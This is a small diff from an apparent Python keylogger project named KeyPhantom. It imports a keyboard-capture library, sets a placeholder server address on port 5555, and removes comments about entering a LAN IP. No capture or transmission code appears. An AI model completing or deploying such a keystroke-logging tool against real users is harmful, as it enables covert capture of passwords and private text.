@@ -6,8 +6,6 @@ import threading
 from pynput import keyboard
 import pandas as pd
 
-# Replace the IP with your server's IP for LAN usage
-# Example: SERVER_ADDRESS = '192.168.1.100:5555'
 SERVER_ADDRESS = '___________:5555'
 
 class KeyPhantom:
